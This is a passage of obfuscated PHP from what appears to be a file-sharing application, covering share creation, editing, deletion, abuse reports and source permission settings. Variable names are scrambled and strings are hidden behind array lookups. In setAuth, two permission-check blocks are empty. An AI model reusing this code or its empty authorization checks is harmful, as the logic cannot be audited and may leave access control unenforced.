unset($Äôüâ‚); $ƒ¨¢µ¥ = array($è¯„ÛÜë[2001] => $—É›Î›™, $è¯„ÛÜë[2002] => $—è÷¦€¼[$è¯„ÛÜë[376]]); return $ƒ¨¢µ¥; } protected function shareAdd($§ü…¹ê, $£²¢È¾œ) { $Óã¯½£± =& $_SERVER[Å¶¨Şêº]; $ìœÚµ = $this->_addShareData($§ü…¹ê, $£²¢È¾œ); if (!empty($£²¢È¾œ[$Óã¯½£±[2003]])) { $this->_shareAuthSet($ìœÚµ, $£²¢È¾œ[$Óã¯½£±[2003]]); } $this->shareEventAdd($§ü…¹ê, $£²¢È¾œ, $Óã¯½£±[2004]); return $ìœÚµ; } protected function shareAddSystem($½¯÷İĞ, $ù‹ãæãØ) { $ÀÕ°àÃ‚ =& $_SERVER[Å¶¨Şêº]; $ëÙ©—° = $this->_addShareData($½¯÷İĞ, $ù‹ãæãØ, $ÀÕ°àÃ‚[1282]); $this->_shareAuthSet($ëÙ©—°, $ù‹ãæãØ[$ÀÕ°àÃ‚[2003]]); return $ëÙ©—°; } private function shareEventAdd($øö²«–Š, $î‡°Õ±Œ, $‹ØôÊ£† = "\141\144\144") { $ÛÈˆíô =& $_SERVER[Å¶¨Şêº]; if (!$øö²«–Š || $øö²«–Š == $ÛÈˆíô[209]) { return; } if ($‹ØôÊ£† == $ÛÈˆíô[2004]) { if ($î‡°Õ±Œ[$ÛÈˆíô[497]] == $ÛÈˆíô[99]) { Model($ÛÈˆíô[570])->eventShare($øö²«–Š, $ÛÈˆíô[2005]); } if ($î‡°Õ±Œ[$ÛÈˆíô[600]] == $ÛÈˆíô[99]) { Model($ÛÈˆíô[570])->eventShare($øö²«–Š, $ÛÈˆíô[2006]); } return; } $µÌ¡€Øó = $this->getInfoByPath($øö²«–Š); $ùæ­‘Š† = $ÛÈˆíô[2007]; if ($µÌ¡€Øó[$ÛÈˆíô[497]] == $ÛÈˆíô[209] && $î‡°Õ±Œ[$ÛÈˆíô[497]] == $ÛÈˆíô[99]) { $ùæ­‘Š† = $ÛÈˆíô[2005]; } if ($µÌ¡€Øó[$ÛÈˆíô[497]] == $ÛÈˆíô[99] && $î‡°Õ±Œ[$ÛÈˆíô[497]] == $ÛÈˆíô[209]) { $ùæ­‘Š† = $ÛÈˆíô[2008]; } if ($µÌ¡€Øó[$ÛÈˆíô[600]] == $ÛÈˆíô[209] && $î‡°Õ±Œ[$ÛÈˆíô[600]] == $ÛÈˆíô[99]) { $ùæ­‘Š† = $ÛÈˆíô[2006]; } if ($µÌ¡€Øó[$ÛÈˆíô[600]] == $ÛÈˆíô[99] && $î‡°Õ±Œ[$ÛÈˆíô[600]] == $ÛÈˆíô[209]) { $ùæ­‘Š† = $ÛÈˆíô[2009]; } Model($ÛÈˆíô[570])->eventShare($øö²«–Š, $ùæ­‘Š†); return; } private function _addShareData($Ù¸€çìÈ, $¬”‹Ê°÷ = array(), $œÓŸ»™ = false) { $şú´á©à =& $_SERVER[Å¶¨Şêº]; $‡Ç§îí = $œÓŸ»™ == $şú´á©à[1282] ? 0 : USER_ID; $­Õãûá = array($şú´á©à[426] => $Ù¸€çìÈ, $şú´á©à[1654] => $‡Ç§îí); if ($Ù¸€çìÈ == 0) { $­Õãûá = array($şú´á©à[2010] => $¬”‹Ê°÷[$şú´á©à[1172]], $şú´á©à[1654] => $‡Ç§îí); } if ($…Ö¥§¡è = $this->where($­Õãûá)->find()) { return $…Ö¥§¡è[$şú´á©à[602]]; } if ($Ù¸€çìÈ == 0) { $è«§üª• = array($şú´á©à[42] => get_path_this($¬”‹Ê°÷[$şú´á©à[95]])); } else { $è«§üª• = Model($şú´á©à[823])->sourceInfo($Ù¸€çìÈ); if (!$è«§üª•) { return !1; } } if (!$¬”‹Ê°÷[$şú´á©à[1563]]) { $¬”‹Ê°÷[$şú´á©à[1563]] = $è«§üª•[$şú´á©à[42]]; } $¢„Â­ØÒ = array($şú´á©à[1654] => $‡Ç§îí, $şú´á©à[426] => $Ù¸€çìÈ, $şú´á©à[1563] => $şú´á©à[12], $şú´á©à[497] => 0, $şú´á©à[600] => 0, $şú´á©à[1172] => $şú´á©à[12], $şú´á©à[317] => $şú´á©à[12], $şú´á©à[886] => $şú´á©à[12], $şú´á©à[2011] => 0, $şú´á©à[2012] => 0, $şú´á©à[759] => 0, $şú´á©à[2013] => $şú´á©à[12], $şú´á©à[1994] => $şú´á©à[12]); $ÚÔ›´²¬ = explode($şú´á©à[60], $şú´á©à[2014]); foreach ($ÚÔ›´²¬ as $†Í©ìÕ ) { if (!isset($¬”‹Ê°÷[$†Í©ìÕ ])) { continue; } $¢„Â­ØÒ[$†Í©ìÕ ] = $¬”‹Ê°÷[$†Í©ìÕ ]; } $©¼„½ÛÙ = $this->add($¢„Â­ØÒ); $õÑ°Á = array($şú´á©à[1994] => short_id($©¼„½ÛÙ)); $this->where(array($şú´á©à[2015] => $©¼„½ÛÙ))->save($õÑ°Á); return $©¼„½ÛÙ; } private function _shareAuthSet($ˆÍíòŠ, $í”‹Æ) { $¹“”†¦» =& $_SERVER[Å¶¨Şêº]; if (!is_array($í”‹Æ)) { return !1; } $Ş®û¾€‰ = Model($¹“”†¦»[1960]); $Ş®û¾€‰->where(array($¹“”†¦»[602] => $ˆÍíòŠ))->delete(); $ù…”È‰ = array(); foreach ($í”‹Æ as $ÑŒĞôæ“) { $¸İ²¬Å« = SourceModel::TYPE_USER; if ($ÑŒĞôæ“[$¹“”†¦»[420]] == SourceModel::TYPE_GROUP) { $¸İ²¬Å« = SourceModel::TYPE_GROUP; } $’­—ó£ = array($¹“”†¦»[602] => $ˆÍíòŠ, $¹“”†¦»[420] => $¸İ²¬Å«, $¹“”†¦»[505] => intval($ÑŒĞôæ“[$¹“”†¦»[505]]), $¹“”†¦»[1956] => 0, $¹“”†¦»[2016] => -1); if ($ÑŒĞôæ“[$¹“”†¦»[1956]]) { $’­—ó£[$¹“”†¦»[1956]] = $ÑŒĞôæ“[$¹“”†¦»[1956]]; } else { if ($ÑŒĞôæ“[$¹“”†¦»[2016]]) { $’­—ó£[$¹“”†¦»[2016]] = $ÑŒĞôæ“[$¹“”†¦»[2016]]; } } $ù…”È‰[] = $’­—ó£; } return $Ş®û¾€‰->addAll($ù…”È‰, array(), !0); } public function numViewAdd($¡‘Â¯Öœ) { $ôœÑ‚íê =& $_SERVER[Å¶¨Şêº]; $®é×¬·ˆ = array($ôœÑ‚íê[2015] => $¡‘Â¯Öœ); $this->where($®é×¬·ˆ)->setAdd($ôœÑ‚íê[2011]); } public function numDownloadAdd($çû£İ¡) { $÷ğ¬…‰ı =& $_SERVER[Å¶¨Şêº]; $–»Œ©”µ = array($÷ğ¬…‰ı[2015] => $çû£İ¡); $this->where($–»Œ©”µ)->setAdd($÷ğ¬…‰ı[2012]); } protected function shareEdit($™â±¼ÚÜ, $„À²÷óó) { $¾°ñàÖ =& $_SERVER[Å¶¨Şêº]; $™ÏöëÁ‚ = $this->getInfo($™â±¼ÚÜ); if (!$™ÏöëÁ‚) { return !1; } $this->_checkLinkShare($„À²÷óó, $™ÏöëÁ‚); $éïıØˆæ = array(); $Ï×®³Ú = explode($¾°ñàÖ[60], $¾°ñàÖ[2017]); foreach ($Ï×®³Ú as $™ğä…†ã) { if (!array_key_exists($™ğä…†ã, $„À²÷óó)) { continue; } $éïıØˆæ[$™ğä…†ã] = $„À²÷óó[$™ğä…†ã]; } $this->shareEventAdd($™ÏöëÁ‚[$¾°ñàÖ[411]], $„À²÷óó, $¾°ñàÖ[1822]); $this->where(array($¾°ñàÖ[2015] => $™â±¼ÚÜ))->save($éïıØˆæ); if (isset($„À²÷óó[$¾°ñàÖ[2003]])) { $this->_shareAuthSet($™â±¼ÚÜ, $„À²÷óó[$¾°ñàÖ[2003]]); } return !0; } private function _checkLinkShare($‘‹İÈ¥¦, $ì´á¾ÊÅ) { $¬øöŒ =& $_SERVER[Å¶¨Şêº]; if ($‘‹İÈ¥¦[$¬øöŒ[497]] != $¬øöŒ[99]) { return; } $Ëí©†Ã = $ì´á¾ÊÅ[$¬øöŒ[98]][$¬øöŒ[411]]; if ($ì´á¾ÊÅ[$¬øöŒ[98]][$¬øöŒ[43]] != $¬øöŒ[211]) { $şËÑí‘õ = $this->_folderReport($Ëí©†Ã); if (!$şËÑí‘õ) { return; } show_json(LNG($¬øöŒ[2018]) . $¬øöŒ[2019] . $şËÑí‘õ, !1); } $’ààÏÄ = Model($¬øöŒ[823])->fileInfoGet($ì´á¾ÊÅ[$¬øöŒ[98]][$¬øöŒ[411]]); if (!$’ààÏÄ) { return; } $­ˆŠ‹¾ş = $this->shareFileMeta($’ààÏÄ[$¬øöŒ[477]]); if (isset($­ˆŠ‹¾ş[$¬øöŒ[384]]) && $­ˆŠ‹¾ş[$¬øöŒ[384]] == $¬øöŒ[99]) { show_json(LNG($¬øöŒ[2020]), !1); } } private function _folderReport($éŸ‚…Ò) { $šªôÀóğ =& $_SERVER[Å¶¨Şêº]; $ö¿ùş¡Ä = array($šªôÀóğ[477] => array($šªôÀóğ[1009], 0), $šªôÀóğ[747] => 3); $ğ—ÀÔüå = Model($šªôÀóğ[2021])->where($ö¿ùş¡Ä)->field($šªôÀóğ[477])->select(); if (!$ğ—ÀÔüå) { return !1; } $ğ—ÀÔüå = array_to_keyvalue($ğ—ÀÔüå, $šªôÀóğ[12], $šªôÀóğ[477]); $÷ÅÏåì³ = $šªôÀóğ[60] . $éŸ‚…Ò . $šªôÀóğ[60]; $ö¿ùş¡Ä = array($šªôÀóğ[477] => array($šªôÀóğ[7], $ğ—ÀÔüå), $šªôÀóğ[520] => array($šªôÀóğ[392], "\45{$÷ÅÏåì³}\45"), $šªôÀóğ[440] => 0); $‰û·ûÎ¥ = Model($šªôÀóğ[823])->where($ö¿ùş¡Ä)->field($šªôÀóğ[2022])->find(); if (!$‰û·ûÎ¥) { return !1; } $‘ èğ›“ = substr($‰û·ûÎ¥[$šªôÀóğ[520]], strpos($‰û·ûÎ¥[$šªôÀóğ[520]], $÷ÅÏåì³)); $ö¿ùş¡Ä = array($šªôÀóğ[411] => array($šªôÀóğ[7], trim($‘ èğ›“, $šªôÀóğ[60]))); $óœÈğô = Model($šªôÀóğ[823])->where($ö¿ùş¡Ä)->field($šªôÀóğ[42])->select(); $ş“Ë’¨¹ = array_to_keyvalue($óœÈğô, $šªôÀóğ[12], $šªôÀóğ[42]); $ş“Ë’¨¹[] = $‰û·ûÎ¥[$šªôÀóğ[42]]; return implode($šªôÀóğ[8], $ş“Ë’¨¹); } protected function remove($à¬µ³«î) { $Ù›­Ï×î =& $_SERVER[Å¶¨Şêº]; if (is_array($à¬µ³«î)) { $à¬µ³«î = array($Ù›­Ï×î[7], $à¬µ³«î); } $¥»ßş±¨ = array($Ù›­Ï×î[602] => $à¬µ³«î); $Õ™»¡ù = $this->where($¥»ßş±¨)->delete(); if ($Õ™»¡ù) { Model($Ù›­Ï×î[603])->where(array($Ù›­Ï×î[602] => $à¬µ³«î))->delete(); } $˜ö¨ã¾¾ = is_array($à¬µ³«î) ? $à¬µ³«î[1] : array($à¬µ³«î); for ($†Ä—”®Õ = 0; $†Ä—”®Õ < count($˜ö¨ã¾¾); $†Ä—”®Õ++) { $¯Çø÷¼ = $this->getInfo($˜ö¨ã¾¾[$†Ä—”®Õ]); if ($¯Çø÷¼[$Ù›­Ï×î[600]] == $Ù›­Ï×î[99]) { Model($Ù›­Ï×î[570])->eventShare($¯Çø÷¼[$Ù›­Ï×î[411]], $Ù›­Ï×î[2009]); } if ($¯Çø÷¼[$Ù›­Ï×î[497]] == $Ù›­Ï×î[99]) { Model($Ù›­Ï×î[570])->eventShare($¯Çø÷¼[$Ù›­Ï×î[411]], $Ù›­Ï×î[2008]); } } return $Õ™»¡ù; } protected function removeBySource($“ÖÛ–Œõ) { $¯šéûç˜ =& $_SERVER[Å¶¨Şêº]; $¤œ’‹ıª = array($¯šéûç˜[426] => array($¯šéûç˜[427], $“ÖÛ–Œõ)); $äèÎİÌÓ = $this->field($¯šéûç˜[602])->where($¤œ’‹ıª)->select(); $äèÎİÌÓ = array_to_keyvalue($äèÎİÌÓ, $¯šéûç˜[12], $¯šéûç˜[602]); if (!$äèÎİÌÓ) { return; } $¤œ’‹ıª = array($¯šéûç˜[2015] => array($¯šéûç˜[427], $äèÎİÌÓ)); $this->where($¤œ’‹ıª)->delete(); Model($¯šéûç˜[603])->where($¤œ’‹ıª)->delete(); } public function listAll($³¥ı­×À) { $±Ãñâ¬‚ =& $_SERVER[Å¶¨Şêº]; $±ß‹ç¹ = array(); if ($³¥ı­×À[$±Ãñâ¬‚[1663]]) { $±ß‹ç¹[$±Ãñâ¬‚[1663]] = $³¥ı­×À[$±Ãñâ¬‚[1663]]; } if ($³¥ı­×À[$±Ãñâ¬‚[758]]) { $•ÒË™Ã = $³¥ı­×À[$±Ãñâ¬‚[759]] ? $³¥ı­×À[$±Ãñâ¬‚[759]] : strtotime(date($±Ãñâ¬‚[2023])); $±ß‹ç¹[$±Ãñâ¬‚[212]] = array($±Ãñâ¬‚[343], array($³¥ı­×À[$±Ãñâ¬‚[758]], $•ÒË™Ã)); } if ($³¥ı­×À[$±Ãñâ¬‚[43]]) { $±ß‹ç¹[$³¥ı­×À[$±Ãñâ¬‚[43]]] = 1; } else { $±ß‹ç¹[] = array($±Ãñâ¬‚[497] => array($±Ãñâ¬‚[1009], 0), $±Ãñâ¬‚[600] => array($±Ãñâ¬‚[1009], 0), $±Ãñâ¬‚[1997] => $±Ãñâ¬‚[1950]); } if ($³¥ı­×À[$±Ãñâ¬‚[1946]]) { $±ß‹ç¹[] = array($±Ãñâ¬‚[1994] => $³¥ı­×À[$±Ãñâ¬‚[1946]], $±Ãñâ¬‚[1563] => array($±Ãñâ¬‚[392], "\45{$³¥ı­×À[$±Ãñâ¬‚[1946]]}\x25"), $±Ãñâ¬‚[1997] => $±Ãñâ¬‚[1950]); } $ó•ƒ¸â = $this->_makeOrder()->where($±ß‹ç¹)->selectPage(20); if (empty($ó•ƒ¸â[$±Ãñâ¬‚[379]])) { return array(); } $this->_listDataApply($ó•ƒ¸â[$±Ãñâ¬‚[379]]); return $ó•ƒ¸â; } public function listDataApply($ööäòšì) { $this->_listDataApply($ööäòšì); return $ööäòšì; } private function _listDataApply(&$é¼¨ÚÎ) { $£§¡´Ç =& $_SERVER[Å¶¨Şêº]; $¨âÇ˜¡ = array_to_keyvalue($é¼¨ÚÎ, $£§¡´Ç[12], $£§¡´Ç[1663]); $±ßáÚ‰Ñ = Model($£§¡´Ç[534])->userListInfo(array_unique($¨âÇ˜¡)); $¦œäÄÚ = array_to_keyvalue($é¼¨ÚÎ, $£§¡´Ç[12], $£§¡´Ç[411]); $ëµ‡ƒ†ë = Model($£§¡´Ç[823])->sourceListInfo($¦œäÄÚ, !0); foreach ($é¼¨ÚÎ as $• ·˜à => &$¤ˆÍıÄŠ) { $ÉÌ˜Œİ = $¤ˆÍıÄŠ[$£§¡´Ç[1663]]; $¤ˆÍıÄŠ[$£§¡´Ç[2024]] = $±ßáÚ‰Ñ[$ÉÌ˜Œİ] ? $±ßáÚ‰Ñ[$ÉÌ˜Œİ] : !1; $öäÏ‹Œ´ = $¤ˆÍıÄŠ[$£§¡´Ç[411]]; $¤ˆÍıÄŠ[$£§¡´Ç[98]] = $ëµ‡ƒ†ë[$öäÏ‹Œ´] ? $ëµ‡ƒ†ë[$öäÏ‹Œ´] : !1; if ($¤ˆÍıÄŠ[$£§¡´Ç[98]][$£§¡´Ç[440]] == $£§¡´Ç[99]) { unset($é¼¨ÚÎ[$• ·˜à]); } if ($¤ˆÍıÄŠ[$£§¡´Ç[98]] != $£§¡´Ç[209] && !$¤ˆÍıÄŠ[$£§¡´Ç[98]]) { unset($é¼¨ÚÎ[$• ·˜à]); } } unset($¤ˆÍıÄŠ); $é¼¨ÚÎ = array_values($é¼¨ÚÎ); } private function _makeOrder($«ë…¸Æˆ = '') { $˜‡ğÈÒë =& $_SERVER[Å¶¨Şêº]; $¨ÑÁıĞ” = array($˜‡ğÈÒë[212], $˜‡ğÈÒë[759], $˜‡ğÈÒë[2011], $˜‡ğÈÒë[2012]); $²®é  = array($˜‡ğÈÒë[459] => $˜‡ğÈÒë[460], $˜‡ğÈÒë[461] => $˜‡ğÈÒë[462]); $Á¸·ïĞø = Input::get($˜‡ğÈÒë[466], $˜‡ğÈÒë[7], $˜‡ğÈÒë[432], $¨ÑÁıĞ”); $Şˆ±µÄ§ = Input::get($˜‡ğÈÒë[467], $˜‡ğÈÒë[7], $˜‡ğÈÒë[2025], array($˜‡ğÈÒë[1943], $˜‡ğÈÒë[461])); $Şˆ±µÄ§ = $²®é [$Şˆ±µÄ§]; $«ë…¸Æˆ = $«ë…¸Æˆ . "{$Á¸·ïĞø}\x20{$Şˆ±µÄ§}"; return $this->order($«ë…¸Æˆ); } public function reportAdd($ñ¦‡ïÆõ) { $Ùºë©¨± =& $_SERVER[Å¶¨Şêº]; $îø†•¾‚ = array($Ùºë©¨±[602] => $ñ¦‡ïÆõ[$Ùºë©¨±[602]], $Ùºë©¨±[1663] => USER_ID); if (Model($Ùºë©¨±[2021])->where($îø†•¾‚)->find()) { return !1; } $ê£øíøÂ = array($Ùºë©¨±[602] => $ñ¦‡ïÆõ[$Ùºë©¨±[602]], $Ùºë©¨±[1563] => $ñ¦‡ïÆõ[$Ùºë©¨±[1563]], $Ùºë©¨±[411] => $ñ¦‡ïÆõ[$Ùºë©¨±[411]], $Ùºë©¨±[477] => $ñ¦‡ïÆõ[$Ùºë©¨±[477]], $Ùºë©¨±[1663] => USER_ID, $Ùºë©¨±[43] => $ñ¦‡ïÆõ[$Ùºë©¨±[43]], $Ùºë©¨±[462] => $ñ¦‡ïÆõ[$Ùºë©¨±[462]]); return Model($Ùºë©¨±[2021])->add($ê£øíøÂ); } public function reportList($“‹Öìª¶) { $¸ªŒ«€Í =& $_SERVER[Å¶¨Şêº]; $˜ÛŸüÊå = array(); if ($“‹Öìª¶[$¸ªŒ«€Í[758]]) { $—ùÄÄÇÏ = $“‹Öìª¶[$¸ªŒ«€Í[759]] ? $“‹Öìª¶[$¸ªŒ«€Í[759]] : strtotime(date($¸ªŒ«€Í[2023])); $˜ÛŸüÊå[$¸ªŒ«€Í[212]] = array($¸ªŒ«€Í[343], array($“‹Öìª¶[$¸ªŒ«€Í[758]], $—ùÄÄÇÏ)); } if (isset($“‹Öìª¶[$¸ªŒ«€Í[43]]) && in_array($“‹Öìª¶[$¸ªŒ«€Í[43]], array($¸ªŒ«€Í[99], $¸ªŒ«€Í[446], $¸ªŒ«€Í[2026], $¸ªŒ«€Í[2027], $¸ªŒ«€Í[2028]))) { $˜ÛŸüÊå[$¸ªŒ«€Í[43]] = $“‹Öìª¶[$¸ªŒ«€Í[43]]; } if (isset($“‹Öìª¶[$¸ªŒ«€Í[747]]) && in_array($“‹Öìª¶[$¸ªŒ«€Í[747]], array($¸ªŒ«€Í[209], $¸ªŒ«€Í[99], $¸ªŒ«€Í[446], $¸ªŒ«€Í[2026]))) { $˜ÛŸüÊå[$¸ªŒ«€Í[747]] = $“‹Öìª¶[$¸ªŒ«€Í[747]]; } $ÈÊŞ×ÇÛ = Input::get($¸ªŒ«€Í[467], $¸ªŒ«€Í[7], $¸ªŒ«€Í[2025], array($¸ªŒ«€Í[1943], $¸ªŒ«€Í[461])); $¢¦ßä = array($¸ªŒ«€Í[459] => $¸ªŒ«€Í[460], $¸ªŒ«€Í[461] => $¸ªŒ«€Í[462]); $å¼©È¬“ = $¸ªŒ«€Í[2029] . $¢¦ßä[$ÈÊŞ×ÇÛ]; $ÂÆ›áÊ¨ = Model($¸ªŒ«€Í[2021])->where($˜ÛŸüÊå)->order($å¼©È¬“)->selectPage(20); if (empty($ÂÆ›áÊ¨[$¸ªŒ«€Í[379]])) { return array(); } $íû‚£ÚÇ = array_to_keyvalue_group($ÂÆ›áÊ¨[$¸ªŒ«€Í[379]], $¸ªŒ«€Í[747], $¸ªŒ«€Í[602]); if (!empty($íû‚£ÚÇ[0])) { $“‹Öìª¶ = $íû‚£ÚÇ[0]; $˜ÛŸüÊå = array($¸ªŒ«€Í[602] => array($¸ªŒ«€Í[7], $“‹Öìª¶)); $™ˆ„‚«ç = $this->where($˜ÛŸüÊå)->field($¸ªŒ«€Í[602])->select(); $™ˆ„‚«ç = array_to_keyvalue($™ˆ„‚«ç, $¸ªŒ«€Í[12], $¸ªŒ«€Í[602]); $®ÍŞç¯û = array_diff($“‹Öìª¶, $™ˆ„‚«ç); if (!empty($®ÍŞç¯û)) { foreach ($ÂÆ›áÊ¨[$¸ªŒ«€Í[379]] as $ü¹òĞá => $£ïö™¢) { if (in_array($£ïö™¢[$¸ªŒ«€Í[602]], $®ÍŞç¯û)) { unset($ÂÆ›áÊ¨[$¸ªŒ«€Í[379]][$ü¹òĞá]); } } } } $this->_listDataApply($ÂÆ›áÊ¨[$¸ªŒ«€Í[379]]); return $ÂÆ›áÊ¨; } public function reportStatus($Ù•¸Ÿİ†) { $ë§¶™ô„ =& $_SERVER[Å¶¨Şêº]; $ß±¤ª£× = array($ë§¶™ô„[408] => $Ù•¸Ÿİ†[$ë§¶™ô„[408]]); $’ß€”Ëš = Model($ë§¶™ô„[2021])->where($ß±¤ª£×)->field($ë§¶™ô„[2030])->find(); if (!$’ß€”Ëš) { return !1; } $‡š©ÎÇÕ = array($ë§¶™ô„[747] => $Ù•¸Ÿİ†[$ë§¶™ô„[747]]); if ($Ù•¸Ÿİ†[$ë§¶™ô„[747]] == $ë§¶™ô„[2026] && $’ß€”Ëš[$ë§¶™ô„[747]] == $ë§¶™ô„[2026]) { $‡š©ÎÇÕ[$ë§¶™ô„[747]] = 0; } $ÖâÚ¡ª– = Model($ë§¶™ô„[2021])->where($ß±¤ª£×)->save($‡š©ÎÇÕ); if ($Ù•¸Ÿİ†[$ë§¶™ô„[747]] == $ë§¶™ô„[446]) { if ($’ß€”Ëš[$ë§¶™ô„[477]] != $ë§¶™ô„[209] && $this->shareFileMeta($’ß€”Ëš[$ë§¶™ô„[477]])) { $this->shareFileMeta($’ß€”Ëš[$ë§¶™ô„[477]], 0); } $this->remove($’ß€”Ëš[$ë§¶™ô„[602]]); return !0; } if ($ÖâÚ¡ª– && $Ù•¸Ÿİ†[$ë§¶™ô„[747]] == $ë§¶™ô„[2026]) { $œ¤ø­†ï = $‡š©ÎÇÕ[$ë§¶™ô„[747]] == $ë§¶™ô„[2026] ? 1 : 0; $this->shareFileMeta($’ß€”Ëš[$ë§¶™ô„[477]], $œ¤ø­†ï); $this->removeByFile($’ß€”Ëš[$ë§¶™ô„[477]]); } return $ÖâÚ¡ª–; } private function removeByFile($Ö¿†³¡û) { $ÓôÏûô =& $_SERVER[Å¶¨Şêº]; $ã«‰ÉìÜ = Model($ÓôÏûô[823])->where(array($ÓôÏûô[477] => $Ö¿†³¡û))->field($ÓôÏûô[411])->select(); $ÁÖŞ¿Ä = array_to_keyvalue($ã«‰ÉìÜ, $ÓôÏûô[12], $ÓôÏûô[411]); $¿ê¹ôÜë = array($ÓôÏûô[411] => array($ÓôÏûô[7], $ÁÖŞ¿Ä), $ÓôÏûô[497] => 1); $ã«‰ÉìÜ = $this->where($¿ê¹ôÜë)->field($ÓôÏûô[602])->select(); if (empty($ã«‰ÉìÜ)) { return; } $ù—ú°Ã = array_to_keyvalue($ã«‰ÉìÜ, $ÓôÏûô[12], $ÓôÏûô[602]); $this->remove($ù—ú°Ã); } private function shareFileMeta($¨ŞÍÈñ¼, $…œ¨ä•ê = null) { $¸·øêÔ‚ =& $_SERVER[Å¶¨Şêº]; $¬İ²ŠıÍ = array($¸·øêÔ‚[477] => $¨ŞÍÈñ¼, $¸·øêÔ‚[105] => $¸·øêÔ‚[2031]); if (is_null($…œ¨ä•ê)) { return Model($¸·øêÔ‚[2032])->where($¬İ²ŠıÍ)->find(); } $¬İ²ŠıÍ[$¸·øêÔ‚[384]] = $…œ¨ä•ê; Model($¸·øêÔ‚[2032])->add($¬İ²ŠıÍ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\x63\145\137\141\165\164\x68"; public function getAuth($À©õÖª²) { $ê“İ“õ¤ =& $_SERVER[Å¶¨Şêº]; $û ŒÖ‹ = $this->sourceAuthSelect($À©õÖª²); $×ÄÎ®¥ì = array(); $şÉ»¨Ü¡ = array(); $©Ö¸“× = 2 << 25; foreach ($û ŒÖ‹ as $ˆ‘òµ†) { $¼Ù†·ı = Model($ê“İ“õ¤[507])->listData($ˆ‘òµ†[$ê“İ“õ¤[1956]]); if (!$¼Ù†·ı) { continue; } $×ÄÎ®¥ì[] = $ˆ‘òµ†; $øİÜ¯‘Ğ = 0; if ($ˆ‘òµ†[$ê“İ“õ¤[420]] == SourceModel::TYPE_GROUP) { $øİÜ¯‘Ğ = $©Ö¸“× * 2; } if ($ˆ‘òµ†[$ê“İ“õ¤[420]] == SourceModel::TYPE_USER) { $øİÜ¯‘Ğ = $©Ö¸“×; } if ($ˆ‘òµ†[$ê“İ“õ¤[420]] == SourceModel::TYPE_USER && $ˆ‘òµ†[$ê“İ“õ¤[505]] == $ê“İ“õ¤[209]) { $øİÜ¯‘Ğ = 0; } $şÉ»¨Ü¡[] = $¼Ù†·ı[$ê“İ“õ¤[422]] + $øİÜ¯‘Ğ; } array_multisort($şÉ»¨Ü¡, SORT_DESC, $×ÄÎ®¥ì); return $×ÄÎ®¥ì; } public function sourceAuthSelect($åœÓõ•Ÿ) { $àÅœæÄó =& $_SERVER[Å¶¨Şêº]; static $ÁœÁêâ° = array(); $ıİ±ßµ = is_array($åœÓõ•Ÿ) ? !1 : !0; if ($ıİ±ßµ) { $åœÓõ•Ÿ = array($åœÓõ•Ÿ); } $ÉÉ¯‹‚ü = array(); foreach ($åœÓõ•Ÿ as $‰ÖôÃ‘Ü) { if (isset($ÁœÁêâ°[$‰ÖôÃ‘Ü])) { $ÉÉ¯‹‚ü[$‰ÖôÃ‘Ü] = $ÁœÁêâ°[$‰ÖôÃ‘Ü]; } } if (count($ÉÉ¯‹‚ü) == count($åœÓõ•Ÿ)) { return $ıİ±ßµ ? $ÉÉ¯‹‚ü[$åœÓõ•Ÿ[0]] : $ÉÉ¯‹‚ü; } $ŸƒŞ°º = $àÅœæÄó[2033]; $ÅÍ‹âÇ« = array($àÅœæÄó[411] => array($àÅœæÄó[7], $åœÓõ•Ÿ)); $ÄÛ‚÷‘Ó = $this->field($ŸƒŞ°º)->order($àÅœæÄó[408])->where($ÅÍ‹âÇ«)->select(); $â¾œê”ù = array_to_keyvalue_group($ÄÛ‚÷‘Ó, $àÅœæÄó[411]); foreach ($åœÓõ•Ÿ as $‰ÖôÃ‘Ü) { $ÁœÁêâ°[$‰ÖôÃ‘Ü] = $â¾œê”ù[$‰ÖôÃ‘Ü] ? $â¾œê”ù[$‰ÖôÃ‘Ü] : array(); } if ($ıİ±ßµ) { return $ÄÛ‚÷‘Ó; } return $â¾œê”ù; } public function setAuth($ŠÔÊ¹Ó¢, $ı¤ˆòÒú) { $‹Ä»¦ÖÈ =& $_SERVER[Å¶¨Şêº]; $•¤Ÿ–‡¼ = Model($‹Ä»¦ÖÈ[1337])->sourceInfo($ŠÔÊ¹Ó¢); if (!$•¤Ÿ–‡¼) { return !1; } if ($•¤Ÿ–‡¼[$‹Ä»¦ÖÈ[420]] != SourceModel::TYPE_GROUP) { return !1; } $ÍÔôù‰ = 1; $ÅŞÅ²è¦ = $•¤Ÿ–‡¼[$‹Ä»¦ÖÈ[505]]; if ($ÅŞÅ²è¦ != $ÍÔôù‰) { $Â‰ı÷ŞÑ = array($‹Ä»¦ÖÈ[1852] => $ÅŞÅ²è¦); $Õá›¶öà = Model($‹Ä»¦ÖÈ[1942])->field($‹Ä»¦ÖÈ[1663])->where($Â‰ı÷ŞÑ)->select(); $Õá›¶öà = array_to_keyvalue($Õá›¶öà, $‹Ä»¦ÖÈ[12], $‹Ä»¦ÖÈ[1663]); } $›®íğÃ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÀÚœ´ğø = array(); foreach ($ı¤ˆòÒú as $¿Šëˆ‘÷) { if (!in_array($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[420]], $›®íğÃ)) { show_json(LNG($‹Ä»¦ÖÈ[2034]), !1); } if ($ÅŞÅ²è¦ != $ÍÔôù‰) { if ($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[420]] == SourceModel::TYPE_GROUP) { } if ($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[505]] != 0 && !in_array($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[505]], $Õá›¶öà)) { } } if ($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[505]] == 0) { $¿Šëˆ‘÷[$‹Ä»¦ÖÈ[420]] = SourceModel::TYPE_USER; } $ÀÚœ´ğø[] = array($‹Ä»¦ÖÈ[411] => $ŠÔÊ¹Ó¢, $‹Ä»¦ÖÈ[420] => intval($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[420]]), $‹Ä»¦ÖÈ[505] => intval($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[505]]), $‹Ä»¦ÖÈ[1956] => intval($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[1956]]) ? intval($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[1956]]) : 0, $‹Ä»¦ÖÈ[2016] => intval($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[2016]]) ? intval($¿Šëˆ‘÷[$‹Ä»¦ÖÈ[2016]]) : -1); } $this->where(array($‹Ä»¦ÖÈ[426] => $ŠÔÊ¹Ó¢))->delete(); 